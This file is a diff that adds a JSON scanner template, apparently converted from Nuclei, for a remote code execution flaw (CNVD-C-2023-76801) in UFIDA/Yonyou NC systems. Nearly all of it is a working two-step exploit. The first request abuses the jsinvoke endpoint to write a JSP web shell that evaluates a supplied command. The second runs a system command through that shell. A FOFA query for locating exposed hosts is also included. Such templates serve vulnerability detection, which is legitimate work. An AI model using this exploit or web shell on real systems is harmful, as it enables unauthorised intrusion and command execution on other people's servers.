@@ -1,0 +1,190 @@
+{
+  "id": "CNVD-C-2023-76801",
+  "name": "UFIDA NC uapjs - Remote Code Execution",
+  "author": "SleepingBag945,s4e-io",
+  "severity": "CRITICAL",
+  "description": "There is an arbitrary method calling vulnerability in UFIDA NC and NCC systems. By exploiting the vulnerability through uapjs (jsinvoke), dangerous methods can be called to cause attacks.\n",
+  "references": [
+    "https://mp.weixin.qq.com/s/8ZRrmUCD2bfznd1MyDDU8A"
+  ],
+  "tags": [
+    "cnvd",
+    "cnvd2023",
+    "yonyou",
+    "rce",
+    "intrusive"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {
+    "fofa": "app\u003d\"用友-NC-Cloud\""
+  },
+  "variables": {
+    "filename": [
+      "{{rand_base(12)}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /uapjs/jsinvoke/?action\u003dinvoke HTTP/1.1\nHost: {{Hostname}}\nContent-type: application/x-www-form-urlencoded\n\n{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\",\"webapps/nc_web/{{filename}}.jsp\"]}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "len(body)\u003d\u003d0",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /{{filename}}.jsp?error\u003dbsh.Interpreter HTTP/1.1\nHost: {{Hostname}}\nContent-type: application/x-www-form-urlencoded\n\ncmd\u003dorg.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"ipconfig\").getInputStream())\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains_all(body,\"Windows\", \"\u003c?xml\", \"DNS\")",
+            "status_code \u003d\u003d 200 || status_code \u003d\u003d 404"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-C-2023-76801",
+    "info": {
+      "name": "UFIDA NC uapjs - Remote Code Execution",
+      "author": "SleepingBag945,s4e-io",
+      "severity": "critical",
+      "description": "There is an arbitrary method calling vulnerability in UFIDA NC and NCC systems. By exploiting the vulnerability through uapjs (jsinvoke), dangerous methods can be called to cause attacks.\n",
+      "reference": [
+        "https://mp.weixin.qq.com/s/8ZRrmUCD2bfznd1MyDDU8A"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "app\u003d\"用友-NC-Cloud\""
+      },
+      "tags": "cnvd,cnvd2023,yonyou,rce,intrusive"
+    },
+    "variables": {
+      "filename": "{{rand_base(12)}}"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /uapjs/jsinvoke/?action\u003dinvoke HTTP/1.1\nHost: {{Hostname}}\nContent-type: application/x-www-form-urlencoded\n\n{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\",\"webapps/nc_web/{{filename}}.jsp\"]}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "len(body)\u003d\u003d0",
+              "status_code \u003d\u003d 200"
+            ]
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /{{filename}}.jsp?error\u003dbsh.Interpreter HTTP/1.1\nHost: {{Hostname}}\nContent-type: application/x-www-form-urlencoded\n\ncmd\u003dorg.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"ipconfig\").getInputStream())\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains_all(body,\"Windows\", \"\u003c?xml\", \"DNS\")",
+              "status_code \u003d\u003d 200 || status_code \u003d\u003d 404"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
